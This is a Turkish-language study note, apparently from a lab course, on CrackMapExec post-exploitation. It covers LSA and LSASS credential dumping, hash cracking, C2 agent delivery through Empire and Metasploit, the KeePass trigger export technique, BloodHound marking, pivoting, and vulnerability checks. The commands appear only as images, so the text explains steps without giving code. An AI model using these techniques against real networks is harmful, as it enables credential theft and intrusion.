+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
